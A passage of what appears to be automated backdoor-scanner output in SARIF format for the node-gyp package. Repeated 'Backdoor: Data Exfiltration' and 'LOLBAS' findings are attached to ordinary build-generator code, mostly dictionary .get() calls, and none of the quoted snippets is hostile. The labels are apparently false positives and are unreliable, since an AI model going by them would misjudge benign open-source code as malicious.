                      "markdown": "`        module names instead of being passed to the linker as flags.\n\n        Args:\n          libraries: the value of spec.get('libraries')\n        Returns:\n          A tuple (static_lib_modules, dynamic_lib_modules, ldflags)\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 747,
                  "startColumn": 19,
                  "endLine": 747,
                  "endColumn": 24,
                  "snippet": {
                    "text": "                    f\"{self.android_module},,,$(GYP_VAR_PREFIX))\"\n                )\n\n        assert spec.get(\"product_dir\") is None  # TODO: not supported?\n        return os.path.join(path, self.ComputeOutputBasename(spec))\n\n    def NormalizeIncludePaths(self, include_paths):\n",
                    "rendered": {
                      "text": "                    f\"{self.android_module},,,$(GYP_VAR_PREFIX))\"\n                )\n\n        assert spec.get(\"product_dir\") is None  # TODO: not supported?\n        return os.path.join(path, self.ComputeOutputBasename(spec))\n\n    def NormalizeIncludePaths(self, include_paths):\n",
                      "markdown": "`                    f\"{self.android_module},,,$(GYP_VAR_PREFIX))\"\n                )\n\n        assert spec.get(\"product_dir\") is None  # TODO: not supported?\n        return os.path.join(path, self.ComputeOutputBasename(spec))\n\n    def NormalizeIncludePaths(self, include_paths):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 703,
                  "startColumn": 30,
                  "endLine": 703,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n                target_ext = \".\" + product_ext\n\n",
                    "rendered": {
                      "text": "        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n                target_ext = \".\" + product_ext\n\n",
                      "markdown": "`        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n                target_ext = \".\" + product_ext\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 702,
                  "startColumn": 25,
                  "endLine": 702,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n                target_ext = \".\" + product_ext\n",
                    "rendered": {
                      "text": "\n        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n                target_ext = \".\" + product_ext\n",
                      "markdown": "`\n        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n                target_ext = \".\" + product_ext\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 701,
                  "startColumn": 32,
                  "endLine": 701,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            )\n\n        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n",
                    "rendered": {
                      "text": "            )\n\n        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n",
                      "markdown": "`            )\n\n        if self.type not in {\"static_library\", \"shared_library\"}:\n            target_prefix = spec.get(\"product_prefix\", target_prefix)\n            target = spec.get(\"product_name\", target)\n            product_ext = spec.get(\"product_extension\")\n            if product_ext:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 647,
                  "startColumn": 19,
                  "endLine": 647,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        distinguish gyp-generated module names.\n        \"\"\"\n\n        if int(spec.get(\"android_unmangled_name\", 0)):\n            assert self.type != \"shared_library\" or self.target.startswith(\"lib\")\n            return self.target\n\n",
                    "rendered": {
                      "text": "        distinguish gyp-generated module names.\n        \"\"\"\n\n        if int(spec.get(\"android_unmangled_name\", 0)):\n            assert self.type != \"shared_library\" or self.target.startswith(\"lib\")\n            return self.target\n\n",
                      "markdown": "`        distinguish gyp-generated module names.\n        \"\"\"\n\n        if int(spec.get(\"android_unmangled_name\", 0)):\n            assert self.type != \"shared_library\" or self.target.startswith(\"lib\")\n            return self.target\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 566,
                  "startColumn": 46,
                  "endLine": 566,
                  "endColumn": 51,
                  "snippet": {
                    "text": "          spec, configs: input from gyp.\n          extra_sources: Sources generated from Actions or Rules.\n        \"\"\"\n        sources = filter(make.Compilable, spec.get(\"sources\", []))\n        generated_not_sources = [x for x in extra_sources if not make.Compilable(x)]\n        extra_sources = filter(make.Compilable, extra_sources)\n\n",
                    "rendered": {
                      "text": "          spec, configs: input from gyp.\n          extra_sources: Sources generated from Actions or Rules.\n        \"\"\"\n        sources = filter(make.Compilable, spec.get(\"sources\", []))\n        generated_not_sources = [x for x in extra_sources if not make.Compilable(x)]\n        extra_sources = filter(make.Compilable, extra_sources)\n\n",
                      "markdown": "`          spec, configs: input from gyp.\n          extra_sources: Sources generated from Actions or Rules.\n        \"\"\"\n        sources = filter(make.Compilable, spec.get(\"sources\", []))\n        generated_not_sources = [x for x in extra_sources if not make.Compilable(x)]\n        extra_sources = filter(make.Compilable, extra_sources)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 533,
                  "startColumn": 33,
                  "endLine": 533,
                  "endColumn": 38,
                  "snippet": {
                    "text": "            self.WriteList(includes, \"LOCAL_C_INCLUDES_%s\" % configname)\n\n            self.WriteLn(\"\\n# Flags passed to only C++ (and not C) files.\")\n            self.WriteList(config.get(\"cflags_cc\"), \"LOCAL_CPPFLAGS_%s\" % configname)\n\n        self.WriteLn(\n            \"\\nLOCAL_CFLAGS := $(MY_CFLAGS_$(GYP_CONFIGURATION)) \"\n",
                    "rendered": {
                      "text": "            self.WriteList(includes, \"LOCAL_C_INCLUDES_%s\" % configname)\n\n            self.WriteLn(\"\\n# Flags passed to only C++ (and not C) files.\")\n            self.WriteList(config.get(\"cflags_cc\"), \"LOCAL_CPPFLAGS_%s\" % configname)\n\n        self.WriteLn(\n            \"\\nLOCAL_CFLAGS := $(MY_CFLAGS_$(GYP_CONFIGURATION)) \"\n",
                      "markdown": "`            self.WriteList(includes, \"LOCAL_C_INCLUDES_%s\" % configname)\n\n            self.WriteLn(\"\\n# Flags passed to only C++ (and not C) files.\")\n            self.WriteList(config.get(\"cflags_cc\"), \"LOCAL_CPPFLAGS_%s\" % configname)\n\n        self.WriteLn(\n            \"\\nLOCAL_CFLAGS := $(MY_CFLAGS_$(GYP_CONFIGURATION)) \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 526,
                  "startColumn": 34,
                  "endLine": 526,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            )\n\n            self.WriteLn(\"\\n# Include paths placed before CFLAGS/CPPFLAGS\")\n            includes = list(config.get(\"include_dirs\", []))\n            includes.extend(extracted_includes)\n            includes = map(Sourceify, map(self.LocalPathify, includes))\n            includes = self.NormalizeIncludePaths(includes)\n",
                    "rendered": {
                      "text": "            )\n\n            self.WriteLn(\"\\n# Include paths placed before CFLAGS/CPPFLAGS\")\n            includes = list(config.get(\"include_dirs\", []))\n            includes.extend(extracted_includes)\n            includes = map(Sourceify, map(self.LocalPathify, includes))\n            includes = self.NormalizeIncludePaths(includes)\n",
                      "markdown": "`            )\n\n            self.WriteLn(\"\\n# Include paths placed before CFLAGS/CPPFLAGS\")\n            includes = list(config.get(\"include_dirs\", []))\n            includes.extend(extracted_includes)\n            includes = map(Sourceify, map(self.LocalPathify, includes))\n            includes = self.NormalizeIncludePaths(includes)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 519,
                  "startColumn": 22,
                  "endLine": 519,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n\n            self.WriteList(\n                config.get(\"defines\"),\n                \"MY_DEFS_%s\" % configname,\n                prefix=\"-D\",\n                quoter=make.EscapeCppDefine,\n",
                    "rendered": {
                      "text": "            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n\n            self.WriteList(\n                config.get(\"defines\"),\n                \"MY_DEFS_%s\" % configname,\n                prefix=\"-D\",\n                quoter=make.EscapeCppDefine,\n",
                      "markdown": "`            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n\n            self.WriteList(\n                config.get(\"defines\"),\n                \"MY_DEFS_%s\" % configname,\n                prefix=\"-D\",\n                quoter=make.EscapeCppDefine,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 513,
                  "startColumn": 49,
                  "endLine": 513,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n            self.WriteLn(\"\\n# Flags passed to both C and C++ files.\")\n            cflags, includes_from_cflags = self.ExtractIncludesFromCFlags(\n                config.get(\"cflags\", []) + config.get(\"cflags_c\", [])\n            )\n            extracted_includes.extend(includes_from_cflags)\n            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n",
                    "rendered": {
                      "text": "\n            self.WriteLn(\"\\n# Flags passed to both C and C++ files.\")\n            cflags, includes_from_cflags = self.ExtractIncludesFromCFlags(\n                config.get(\"cflags\", []) + config.get(\"cflags_c\", [])\n            )\n            extracted_includes.extend(includes_from_cflags)\n            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n",
                      "markdown": "`\n            self.WriteLn(\"\\n# Flags passed to both C and C++ files.\")\n            cflags, includes_from_cflags = self.ExtractIncludesFromCFlags(\n                config.get(\"cflags\", []) + config.get(\"cflags_c\", [])\n            )\n            extracted_includes.extend(includes_from_cflags)\n            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 513,
                  "startColumn": 22,
                  "endLine": 513,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n            self.WriteLn(\"\\n# Flags passed to both C and C++ files.\")\n            cflags, includes_from_cflags = self.ExtractIncludesFromCFlags(\n                config.get(\"cflags\", []) + config.get(\"cflags_c\", [])\n            )\n            extracted_includes.extend(includes_from_cflags)\n            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n",
                    "rendered": {
                      "text": "\n            self.WriteLn(\"\\n# Flags passed to both C and C++ files.\")\n            cflags, includes_from_cflags = self.ExtractIncludesFromCFlags(\n                config.get(\"cflags\", []) + config.get(\"cflags_c\", [])\n            )\n            extracted_includes.extend(includes_from_cflags)\n            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n",
                      "markdown": "`\n            self.WriteLn(\"\\n# Flags passed to both C and C++ files.\")\n            cflags, includes_from_cflags = self.ExtractIncludesFromCFlags(\n                config.get(\"cflags\", []) + config.get(\"cflags_c\", [])\n            )\n            extracted_includes.extend(includes_from_cflags)\n            self.WriteList(cflags, \"MY_CFLAGS_%s\" % configname)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 402,
                  "startColumn": 27,
                  "endLine": 402,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                    if dir:\n                        dirs.add(dir)\n                extra_outputs += outputs\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources.extend(outputs)\n\n                components = []\n",
                    "rendered": {
                      "text": "                    if dir:\n                        dirs.add(dir)\n                extra_outputs += outputs\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources.extend(outputs)\n\n                components = []\n",
                      "markdown": "`                    if dir:\n                        dirs.add(dir)\n                extra_outputs += outputs\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources.extend(outputs)\n\n                components = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 380,
                  "startColumn": 35,
                  "endLine": 380,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            self.WriteLn('# \"%s\":' % rule)\n\n            inputs = rule.get(\"inputs\")\n            for rule_source in rule.get(\"rule_sources\", []):\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n                    rule_source_basename\n",
                    "rendered": {
                      "text": "            self.WriteLn('# \"%s\":' % rule)\n\n            inputs = rule.get(\"inputs\")\n            for rule_source in rule.get(\"rule_sources\", []):\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n                    rule_source_basename\n",
                      "markdown": "`            self.WriteLn('# \"%s\":' % rule)\n\n            inputs = rule.get(\"inputs\")\n            for rule_source in rule.get(\"rule_sources\", []):\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n                    rule_source_basename\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 379,
                  "startColumn": 25,
                  "endLine": 379,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            self.WriteLn('\\n### Generated for rule \"%s\":' % name)\n            self.WriteLn('# \"%s\":' % rule)\n\n            inputs = rule.get(\"inputs\")\n            for rule_source in rule.get(\"rule_sources\", []):\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n",
                    "rendered": {
                      "text": "            self.WriteLn('\\n### Generated for rule \"%s\":' % name)\n            self.WriteLn('# \"%s\":' % rule)\n\n            inputs = rule.get(\"inputs\")\n            for rule_source in rule.get(\"rule_sources\", []):\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n",
                      "markdown": "`            self.WriteLn('\\n### Generated for rule \"%s\":' % name)\n            self.WriteLn('# \"%s\":' % rule)\n\n            inputs = rule.get(\"inputs\")\n            for rule_source in rule.get(\"rule_sources\", []):\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 371,
                  "startColumn": 23,
                  "endLine": 371,
                  "endColumn": 28,
                  "snippet": {
                    "text": "            return\n\n        for rule in rules:\n            if len(rule.get(\"rule_sources\", [])) == 0:\n                continue\n            name = make.StringToMakefileVariable(\n                \"{}_{}\".format(self.relative_target, rule[\"rule_name\"])\n",
                    "rendered": {
                      "text": "            return\n\n        for rule in rules:\n            if len(rule.get(\"rule_sources\", [])) == 0:\n                continue\n            name = make.StringToMakefileVariable(\n                \"{}_{}\".format(self.relative_target, rule[\"rule_name\"])\n",
                      "markdown": "`            return\n\n        for rule in rules:\n            if len(rule.get(\"rule_sources\", [])) == 0:\n                continue\n            name = make.StringToMakefileVariable(\n                \"{}_{}\".format(self.relative_target, rule[\"rule_name\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 282,
                  "startColumn": 25,
                  "endLine": 282,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                dir = os.path.split(out)[0]\n                if dir:\n                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n\n            # Prepare the actual command.\n",
                    "rendered": {
                      "text": "                dir = os.path.split(out)[0]\n                if dir:\n                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n\n            # Prepare the actual command.\n",
                      "markdown": "`                dir = os.path.split(out)[0]\n                if dir:\n                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n\n            # Prepare the actual command.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 15,
                  "endLine": 234,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        self.WriteLn()\n\n        # Sources.\n        if spec.get(\"sources\", []) or extra_sources:\n            self.WriteSources(spec, configs, extra_sources)\n\n        self.WriteTarget(\n",
                    "rendered": {
                      "text": "        self.WriteLn()\n\n        # Sources.\n        if spec.get(\"sources\", []) or extra_sources:\n            self.WriteSources(spec, configs, extra_sources)\n\n        self.WriteTarget(\n",
                      "markdown": "`        self.WriteLn()\n\n        # Sources.\n        if spec.get(\"sources\", []) or extra_sources:\n            self.WriteSources(spec, configs, extra_sources)\n\n        self.WriteTarget(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 43,
                  "endLine": 158,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        extra_outputs = []\n        extra_sources = []\n\n        self.android_class = MODULE_CLASSES.get(self.type, \"GYP\")\n        self.android_module = self.ComputeAndroidModule(spec)\n        (self.android_stem, self.android_suffix) = self.ComputeOutputParts(spec)\n        self.output = self.output_binary = self.ComputeOutput(spec)\n",
                    "rendered": {
                      "text": "        extra_outputs = []\n        extra_sources = []\n\n        self.android_class = MODULE_CLASSES.get(self.type, \"GYP\")\n        self.android_module = self.ComputeAndroidModule(spec)\n        (self.android_stem, self.android_suffix) = self.ComputeOutputParts(spec)\n        self.output = self.output_binary = self.ComputeOutput(spec)\n",
                      "markdown": "`        extra_outputs = []\n        extra_sources = []\n\n        self.android_class = MODULE_CLASSES.get(self.type, \"GYP\")\n        self.android_module = self.ComputeAndroidModule(spec)\n        (self.android_stem, self.android_suffix) = self.ComputeOutputParts(spec)\n        self.output = self.output_binary = self.ComputeOutput(spec)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 37,
                  "endLine": 81,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\ndef IsCPPExtension(ext):\n    return make.COMPILABLE_EXTENSIONS.get(ext) == \"cxx\"\n\n\ndef Sourceify(path):\n",
                    "rendered": {
                      "text": "\n\ndef IsCPPExtension(ext):\n    return make.COMPILABLE_EXTENSIONS.get(ext) == \"cxx\"\n\n\ndef Sourceify(path):\n",
                      "markdown": "`\n\ndef IsCPPExtension(ext):\n    return make.COMPILABLE_EXTENSIONS.get(ext) == \"cxx\"\n\n\ndef Sourceify(path):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1038,
                  "startColumn": 25,
                  "endLine": 1038,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n    def CalculateMakefilePath(build_file, base_name):\n",
                    "rendered": {
                      "text": "    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n    def CalculateMakefilePath(build_file, base_name):\n",
                      "markdown": "`    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n    def CalculateMakefilePath(build_file, base_name):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSNew.py"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 13,
                  "endLine": 266,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        sln_root = os.path.split(self.path)[0]\n        for e in all_entries:\n            relative_path = gyp.common.RelativePath(e.path, sln_root)\n            # msbuild does not accept an empty folder_name.\n            # use '.' in case relative_path is empty.\n            folder_name = relative_path.replace(\"/\", \"\\\\\") or \".\"\n            f.write(\n",
                    "rendered": {
